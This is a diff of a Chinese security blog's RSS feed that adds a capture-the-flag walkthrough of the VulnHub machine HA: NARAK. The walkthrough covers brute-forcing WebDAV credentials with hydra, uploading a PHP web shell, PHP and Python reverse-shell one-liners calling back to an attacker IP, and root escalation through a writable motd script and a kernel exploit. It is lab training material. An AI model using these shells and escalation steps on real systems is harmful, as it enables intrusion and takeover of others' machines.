@@ -1,11 +1,188 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:webfeeds="http://webfeeds.org/rss/1.0"><channel><title>echo</title><link>https://www.inecho.cc/zh-cn/</link><description>Recent content on echo</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><lastBuildDate>Sun, 03 Mar 2024 00:00:00 +0000</lastBuildDate><atom:link href="https://www.inecho.cc/zh-cn/index.xml" rel="self" type="application/rss+xml"/><item><title>关于</title><link>https://www.inecho.cc/zh-cn/about/</link><pubDate>Sun, 20 Aug 2017 21:38:52 +0800</pubDate><guid>https://www.inecho.cc/zh-cn/about/</guid><description>&lt;h2 id="hi我是-jackhttpswwwinechocc">👋Hi,我是 &lt;a href="https://www.inecho.cc/">Jack&lt;/a>&lt;/h2>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:webfeeds="http://webfeeds.org/rss/1.0"><channel><title>echo</title><link>https://www.inecho.cc/zh-cn/</link><description>Recent content on echo</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><lastBuildDate>Sun, 10 Mar 2024 00:00:00 +0000</lastBuildDate><atom:link href="https://www.inecho.cc/zh-cn/index.xml" rel="self" type="application/rss+xml"/><item><title>关于</title><link>https://www.inecho.cc/zh-cn/about/</link><pubDate>Sun, 20 Aug 2017 21:38:52 +0800</pubDate><guid>https://www.inecho.cc/zh-cn/about/</guid><description>&lt;h2 id="hi我是-jackhttpswwwinechocc">👋Hi,我是 &lt;a href="https://www.inecho.cc/">Jack&lt;/a>&lt;/h2>
 &lt;p>网络安全从业者，不知名三分熟摄影师。喜欢探索新领域，对摄影、电影和运动有极大兴趣，平时喜欢折腾一些无用但又有趣的东西。你可以使用 &lt;a href="mailto:rt7h.y.c@gmail.com">📨email&lt;/a> 联系我。&lt;/p>
 &lt;p>终身学习，知行合一。希望我能够不断学习、不断成长，同时在闲暇空隙不断思考、不断探索。保持开明的心态去看待这个世界。&lt;/p>
 &lt;h2 id="关于网站">🖥️关于网站&lt;/h2>
 &lt;p>&lt;strong>inecho.cc&lt;/strong> 实际上是我的第三个域名，同时 inecho 也是我的第三个个人网站。在此前，前两个网站分别是使用 WordPress 框架的「多次元罐头」，和使用 Notion &amp;amp; Vercel 方案的摄影网站。但这两个网站都因各种原因没有坚持下去，在网站关停一年后我终究还是按捺不住搭建了新的博客网站，即你现在看到的 &lt;a href="https://www.inecho.cc/">inecho.cc&lt;/a> 。&lt;/p>
 &lt;p>&lt;strong>inecho.cc&lt;/strong> 最初源于「echo 回声」这个含义，寓意为发出声音、听到回声、自我精进。因此我希望能够在 inecho 上笔耕不辍，多写一些小文章，多做一些思考。&lt;/p>
 &lt;h2 id="最后">⏳最后&lt;/h2>
-&lt;p>本网站创建于2024年1月，农历癸卯年。&lt;/p></description></item><item><title>DVWA 01 - Brute Force</title><link>https://www.inecho.cc/zh-cn/2024/03/03/dvwa-01-brute-force/</link><pubDate>Sun, 03 Mar 2024 00:00:00 +0000</pubDate><guid>https://www.inecho.cc/zh-cn/2024/03/03/dvwa-01-brute-force/</guid><description>&lt;h2 id="前言介绍">前言介绍&lt;/h2>
+&lt;p>本网站创建于2024年1月，农历癸卯年。&lt;/p></description></item><item><title>靶机：HA_NARAK</title><link>https://www.inecho.cc/zh-cn/2024/03/10/%E9%9D%B6%E6%9C%BAha_narak/</link><pubDate>Sun, 10 Mar 2024 00:00:00 +0000</pubDate><guid>https://www.inecho.cc/zh-cn/2024/03/10/%E9%9D%B6%E6%9C%BAha_narak/</guid><description>&lt;h2 id="一靶机概述">一、靶机概述&lt;/h2>
+&lt;h3 id="1-靶机描述">1 靶机描述&lt;/h3>
+&lt;p>所属系列：&lt;a href="https://www.vulnhub.com/series/ha,242/">HA&lt;/a>（此系列共17台）&lt;/p>
+&lt;p>难度等级：中等&lt;/p>
+&lt;p>达成目标：取得 root 权限 + 2 Flag&lt;/p>
+&lt;p>备注信息：使用 VMware 虚拟机运行&lt;/p>
+&lt;h3 id="2-下载地址">2 下载地址&lt;/h3>
+&lt;p>&lt;a href="https://www.vulnhub.com/entry/ha-narak,569/">https://www.vulnhub.com/entry/ha-narak,569/&lt;/a>&lt;/p>
+&lt;h2 id="二信息收集">二、信息收集&lt;/h2>
+&lt;h3 id="1-主机发现">1 主机发现&lt;/h3>
+&lt;p>使用 arp-scan 找到局域网内的靶机&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>root㉿kali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─# arp-scan --interface eth0 10.4.7.0/24
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Interface: eth0, type: EN10MB, MAC: 00:0c:29:df:79:90, IPv4: 10.4.7.152
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Starting arp-scan 1.10.0 with &lt;span class="m">256&lt;/span> hosts &lt;span class="o">(&lt;/span>https://github.com/royhills/arp-scan&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">10.4.7.1 00:50:56:c0:00:08 VMware, Inc.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">10.4.7.2 00:50:56:ee:6e:ca VMware, Inc.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">10.4.7.153 00:0c:29:2c:4c:b4 VMware, Inc.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">10.4.7.254 00:50:56:fc:41:8b VMware, Inc.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">4&lt;/span> packets received by filter, &lt;span class="m">0&lt;/span> packets dropped by kernel
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Ending arp-scan 1.10.0: &lt;span class="m">256&lt;/span> hosts scanned in 2.024 seconds &lt;span class="o">(&lt;/span>126.48 hosts/sec&lt;span class="o">)&lt;/span>. &lt;span class="m">4&lt;/span> responded
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>确定靶机为 &lt;code>10.4.7.153 00:0c:29:2c:4c:b4 VMware, Inc.&lt;/code>&lt;/p>
+&lt;h3 id="2-主机扫描">2 主机扫描&lt;/h3>
+&lt;h4 id="21-端口扫描">2.1 端口扫描&lt;/h4>
+&lt;p>使用 nmap 扫描主机主要的全部信息&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>root㉿kali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─# nmap -A 10.4.7.153
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Starting Nmap 7.94SVN &lt;span class="o">(&lt;/span> https://nmap.org &lt;span class="o">)&lt;/span> at 2024-03-10 04:17 EDT
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nmap scan report &lt;span class="k">for&lt;/span> bogon &lt;span class="o">(&lt;/span>10.4.7.153&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Host is up &lt;span class="o">(&lt;/span>0.00073s latency&lt;span class="o">)&lt;/span>.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Not shown: &lt;span class="m">998&lt;/span> closed tcp ports &lt;span class="o">(&lt;/span>reset&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PORT STATE SERVICE VERSION
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 &lt;span class="o">(&lt;/span>Ubuntu Linux&lt;span class="p">;&lt;/span> protocol 2.0&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> ssh-hostkey:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="m">2048&lt;/span> 71:bd:59:2d:22:1e:b3:6b:4f:06:bf:83:e1:cc:92:43 &lt;span class="o">(&lt;/span>RSA&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="m">256&lt;/span> f8:ec:45:84:7f:29:33:b2:8d:fc:7d:07:28:93:31:b0 &lt;span class="o">(&lt;/span>ECDSA&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_ &lt;span class="m">256&lt;/span> d0:94:36:96:04:80:33:10:40:68:32:21:cb:ae:68:f9 &lt;span class="o">(&lt;/span>ED25519&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">80/tcp open http Apache httpd 2.4.29 &lt;span class="o">((&lt;/span>Ubuntu&lt;span class="o">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_http-title: HA: NARAK
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_http-server-header: Apache/2.4.29 &lt;span class="o">(&lt;/span>Ubuntu&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">MAC Address: 00:0C:29:2C:4C:B4 &lt;span class="o">(&lt;/span>VMware&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Device type: general purpose
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Running: Linux 3.X&lt;span class="p">|&lt;/span>4.X
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">OS details: Linux 3.2 - 4.9
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Network Distance: &lt;span class="m">1&lt;/span> hop
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Service Info: OS: Linux&lt;span class="p">;&lt;/span> CPE: cpe:/o:linux:linux_kernel
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">TRACEROUTE
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">HOP RTT ADDRESS
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">1&lt;/span> 0.73 ms bogon &lt;span class="o">(&lt;/span>10.4.7.153&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nmap &lt;span class="k">done&lt;/span>: &lt;span class="m">1&lt;/span> IP address &lt;span class="o">(&lt;/span>&lt;span class="m">1&lt;/span> host up&lt;span class="o">)&lt;/span> scanned in 14.11 seconds
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="22-网站探测">2.2 网站探测&lt;/h4>
+&lt;p>nmap 扫描已知开放了80端口，访问10.4.7.153，发现存在一个网站&lt;/p>
+&lt;p>&lt;img src="img/20240310162816.png" alt="image.png">&lt;/p>
+&lt;p>但是没有发现什么有价值的内容，那就直接对网站进行目录爆破，使用 gobuster 对网站目录进行详细的爆破扫描&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># -r 对出现的每一条目录进行递归扫描 -t 设置扫描线程 -e 显示HTTP状态码&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>root㉿kali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─# gobuster dir -r -u http://10.4.7.153 -x txt,html,php -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t &lt;span class="m">100&lt;/span> -e
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">===============================================================&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Gobuster v3.6
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">by OJ Reeves &lt;span class="o">(&lt;/span>@TheColonial&lt;span class="o">)&lt;/span> &lt;span class="p">&amp;amp;&lt;/span> Christian Mehlmauer &lt;span class="o">(&lt;/span>@firefart&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">===============================================================&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Url: http://10.4.7.153
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Method: GET
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Threads: &lt;span class="m">100&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Wordlist: /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Negative Status codes: &lt;span class="m">404&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> User Agent: gobuster/3.6
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Extensions: txt,html,php
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Follow Redirect: &lt;span class="nb">true&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Expanded: &lt;span class="nb">true&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Timeout: &lt;span class="nv">10s&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">===============================================================&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Starting gobuster in directory enumeration &lt;span class="nv">mode&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">===============================================================&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">http://10.4.7.153/.php &lt;span class="o">(&lt;/span>Status: 403&lt;span class="o">)&lt;/span> &lt;span class="o">[&lt;/span>Size: 275&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">http://10.4.7.153/tips.txt &lt;span class="o">(&lt;/span>Status: 200&lt;span class="o">)&lt;/span> &lt;span class="o">[&lt;/span>Size: 58&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">http://10.4.7.153/index.html &lt;span class="o">(&lt;/span>Status: 200&lt;span class="o">)&lt;/span> &lt;span class="o">[&lt;/span>Size: 2998&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">http://10.4.7.153/.html &lt;span class="o">(&lt;/span>Status: 403&lt;span class="o">)&lt;/span> &lt;span class="o">[&lt;/span>Size: 275&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">http://10.4.7.153/images &lt;span class="o">(&lt;/span>Status: 200&lt;span class="o">)&lt;/span> &lt;span class="o">[&lt;/span>Size: 4563&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">http://10.4.7.153/webdav &lt;span class="o">(&lt;/span>Status: 401&lt;span class="o">)&lt;/span> &lt;span class="o">[&lt;/span>Size: 457&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">http://10.4.7.153/.html &lt;span class="o">(&lt;/span>Status: 403&lt;span class="o">)&lt;/span> &lt;span class="o">[&lt;/span>Size: 275&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">http://10.4.7.153/.php &lt;span class="o">(&lt;/span>Status: 403&lt;span class="o">)&lt;/span> &lt;span class="o">[&lt;/span>Size: 275&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">http://10.4.7.153/server-status &lt;span class="o">(&lt;/span>Status: 403&lt;span class="o">)&lt;/span> &lt;span class="o">[&lt;/span>Size: 275&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Progress: &lt;span class="m">882240&lt;/span> / &lt;span class="m">882244&lt;/span> &lt;span class="o">(&lt;/span>100.00%&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">===============================================================&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">Finished&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">===============================================================&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>先访问一下 http://10.4.7.153/tips.txt ，提示我们需要在 creds.txt 文件中发现线索&lt;/p>
+&lt;p>&lt;img src="img/20240310172842.png" alt="image.png">&lt;/p>
+&lt;p>但是在之前的 gobuster 扫描中没有扫描到 creds.txt 文件，这里查了一下别人打靶机的笔记，发现需要使用 nmap 进行 UDP 协议的端口扫描，但是我这里使用 &lt;code>nmap -sU&lt;/code> 进行扫描后没有发现其他人笔记中写到的 69 端口 TFTP 服务。&lt;/p>
+&lt;p>接着访问一下 http://10.4.7.153/webdav ，可以看到需要用户名和密码登录，但是网站没有关于这点的任何提示。那就使用 &lt;strong>&lt;a href="https://www.freebuf.com/articles/network/190128.html">kali-cewl 工具&lt;/a>&lt;/strong> 先生成字典，再用 hydra 爆破。&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">cewl 10.4.7.153 -w pass.txt
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">hydra -L pass.txt -P pass.txt http-get://10.4.7.153/webdav
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="img/20240310174552.png" alt="image.png">&lt;/p>
+&lt;p>爆破成功，得到用户名和密码&lt;/p>
+&lt;pre tabindex="0">&lt;code>login: yamdoot
+password: Swarg
+&lt;/code>&lt;/pre>&lt;p>&lt;img src="img/20240310174722.png" alt="image.png">&lt;/p>
+&lt;p>登录成功后打开发现没有任何有用的文件，但是 webdav 是可以上传文件的&lt;/p>
+&lt;h2 id="三getshell">三、GetShell&lt;/h2>
+&lt;h3 id="1-上传反弹shell">1 上传反弹shell&lt;/h3>
+&lt;p>关于使用 webdav 协议上传反弹 shell 有很多姿势&lt;/p>
+&lt;h4 id="11-cadaver-工具上传">1.1 cadaver 工具上传&lt;/h4>
+&lt;p>我们可以通过 cadaver 工具登录 webdav 上传 shell 文件&lt;/p>
+&lt;pre tabindex="0">&lt;code>cadaver http://10.4.7.153/webdav
+&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>put /root/Desktop/getshell.php
+&lt;/code>&lt;/pre>&lt;p>&lt;img src="img/20240310180639.png" alt="image.png">&lt;/p>
+&lt;p>反弹shell、一句话木马我尝试了很多，但是无论是 nc 还是蚁剑都连接不上，只有 system() 可以使用&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span> &lt;span class="nx">system&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;cmd&amp;#39;&lt;/span>&lt;span class="p">]);&lt;/span>&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="img/20240310183722.png" alt="image.png">&lt;/p>
+&lt;p>尝试在这里使用反弹shell连接&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">php&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">r&lt;/span> &lt;span class="s1">&amp;#39;$sock=fsockopen(&amp;#34;10.4.7.152&amp;#34;,4444);$proc=proc_open(&amp;#34;/bin/sh -i&amp;#34;, array(0=&amp;gt;$sock, 1=&amp;gt;$sock, 2=&amp;gt;$sock),$pipes);&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>or&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="n">python3&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">c&lt;/span> &lt;span class="s1">&amp;#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;#34;10.4.7.152&amp;#34;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;#34;/bin/sh&amp;#34;,&amp;#34;-i&amp;#34;]);&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="img/20240310184345.png" alt="image.png">&lt;/p>
+&lt;p>连接成功，先获取一下 pty&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="n">python3&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">c&lt;/span> &lt;span class="s2">&amp;#34;import pty;pty.spawn(&amp;#39;/bin/bash&amp;#39;)&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="img/20240310184757.png" alt="image.png">&lt;/p>
+&lt;h4 id="12-msfconsole">1.2 msfconsole&lt;/h4>
+&lt;pre tabindex="0">&lt;code>search webdav
+use exploit/windows/http/xampp_webdav_upload_php
+show options
+set USERNAME yamdoot
+set PASSWORD Swarg
+set RHOST 10.4.7.153
+exploit
+&lt;/code>&lt;/pre>&lt;p>运行 payload 之后即可在 webdav 目录下成功上传一个 反弹shell 脚本&lt;/p>
+&lt;p>&lt;img src="img/20240310191514.png" alt="image.png">&lt;/p>
+&lt;p>需要点击它才可以在 msf 中连接&lt;/p>
+&lt;p>&lt;img src="img/20240310191559.png" alt="image.png">&lt;/p>
+&lt;h3 id="2-获取flag">2 获取FLAG&lt;/h3>
+&lt;p>在 /home/inferno 目录下发现第一个 flag&lt;/p>
+&lt;p>&lt;img src="img/20240310191826.png" alt="image.png">&lt;/p>
+&lt;h2 id="四提权">四、提权&lt;/h2>
+&lt;h3 id="1-ssh登录">1 ssh登录&lt;/h3>
+&lt;p>先进行一下靶机内部的信息收集&lt;/p>
+&lt;p>在 /mnt 目录下发现一个加密的文件 /mnt/hell.sh，密文如下&lt;/p>
+&lt;pre tabindex="0">&lt;code>--[-----&amp;gt;+&amp;lt;]&amp;gt;---.+++++.+.+++++++++++.--.+++[-&amp;gt;+++&amp;lt;]&amp;gt;++.++++++.--[---&amp;gt;+&amp;lt;]&amp;gt;--.-----.++++.
+&lt;/code>&lt;/pre>&lt;p>&lt;img src="img/20240310192401.png" alt="image.png">&lt;/p>
+&lt;p>这其实就是使用混淆加密算法Brainfuck加密的，解密一下&lt;/p>
+&lt;p>&lt;img src="img/20240310192638.png" alt="image.png">&lt;/p>
+&lt;p>得到密文 chitragupt ，猜测应该是某一项服务的密码，从之前 flag 所属的用户可以推测密码应该是属于 inferno 用户的，再结合之前端口扫描时探测到的ssh服务，尝试登录一下&lt;/p>
+&lt;p>&lt;img src="img/20240310193034.png" alt="image.png">&lt;/p>
+&lt;h3 id="2-提权">2 提权&lt;/h3>
+&lt;p>该靶机提权的方式有很多种，这里演示几种&lt;/p>
+&lt;h4 id="21-motd-提权">2.1 motd 提权&lt;/h4>
+&lt;p>motd是负责 ssh 登录后，页面欢迎语提示语的，用户可以通过配置文件自定义欢迎提示信息。具体配置文件在 /etc/update-motd.d/* ，理论上这个目录下的任意文件都可以。通常修改 00-header 文件即可。&lt;/p>
+&lt;p>查看 /etc/update-motd.d/00-header 文件是否具有所需的权限&lt;/p>
+&lt;pre tabindex="0">&lt;code>ls -al /etc/update-motd.d/00-header
+&lt;/code>&lt;/pre>&lt;p>&lt;img src="img/20240310193949.png" alt="image.png">&lt;/p>
+&lt;p>写入提权脚本，这里有两种思路，一种是直接反弹shell，利用python等脚本。另一种是把修改root密码的脚本写入该文件即可&lt;/p>
+&lt;pre tabindex="0">&lt;code>echo &amp;#34;echo &amp;#39;root:123456&amp;#39; | sudo chpasswd&amp;#34; &amp;gt;&amp;gt; /etc/update-motd.d/00-header
+&lt;/code>&lt;/pre>&lt;p>然后退出 ssh 再次登录，然后即可切换到 root 用户以提权&lt;/p>
+&lt;p>&lt;img src="img/20240310194300.png" alt="image.png">&lt;/p>
+&lt;hr>
+&lt;p>当然这里我们也可以使用脚本探测当前系统下有哪些文件具有可以用来提权的权限&lt;/p>
+&lt;p>脚本的项目地址：https://github.com/carlospolop/PEASS-ng&lt;/p>
+&lt;pre tabindex="0">&lt;code>python3 -m http.server 80
+&lt;/code>&lt;/pre>&lt;p>&lt;img src="img/20240310195501.png" alt="image.png">&lt;/p>
+&lt;p>&lt;img src="img/20240310195637.png" alt="image.png">&lt;/p>
+&lt;hr>
+&lt;h4 id="22-内核漏洞提权">2.2 内核漏洞提权&lt;/h4>
+&lt;p>先查看内核版本和系统发行版本&lt;/p>
+&lt;p>&lt;img src="img/20240310200928.png" alt="image.png">&lt;/p>
+&lt;p>搜索可以提权的漏洞，我这里使用的是&lt;a href="https://github.com/briskets/CVE-2021-3493">CVE-2021-3493&lt;/a>，该漏洞可以对 Ubuntu 20.10 以下的版本提权&lt;/p>
+&lt;p>下载到本地后，先编译成可执行文件，然后再下载到靶机上&lt;/p>
+&lt;p>&lt;img src="img/20240310201431.png" alt="image.png">&lt;/p>
+&lt;p>&lt;img src="img/20240310202316.png" alt="image.png">&lt;/p>
+&lt;p>赋权执行的时候发现，靶机中的 GNU C 库版本太低，解决方式使用相同版本的依赖库编译，或者在编译的时候将文件运行所需的依赖全部编译进去。我这里选择的是后者&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">gcc -static -o exp exploit.c
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="img/20240310202721.png" alt="image.png">&lt;/p>
+&lt;p>&lt;img src="img/20240310202644.png" alt="image.png">&lt;/p>
+&lt;p>至此，提权成功&lt;/p></description></item><item><title>DVWA 01 - Brute Force</title><link>https://www.inecho.cc/zh-cn/2024/03/03/dvwa-01-brute-force/</link><pubDate>Sun, 03 Mar 2024 00:00:00 +0000</pubDate><guid>https://www.inecho.cc/zh-cn/2024/03/03/dvwa-01-brute-force/</guid><description>&lt;h2 id="前言介绍">前言介绍&lt;/h2>
 &lt;p>暴力破解是一种密码破解的常见攻击手段，它利用计算机系统中存储或传输的数据来尝试猜测密码。DVWA中的Brute Force模块旨在帮助用户了解和防御这种攻击。在这个模块中，用户可以模拟暴力破解攻击，通过多次尝试猜测用户名和密码的组合来获取对应账户的访问权限。&lt;/p>
 &lt;p>密码破解的过程往往通过反复尝试猜测密码来实现。用户通常设置弱密码，比如字典中的单词、常见的姓氏或者过于简短的密码，例如少于6或7个字符的密码，甚至是可预测的模式，比如替换字母为数字的leet speak（例如，“password”变成了“p@55w0rd”）。&lt;/p>
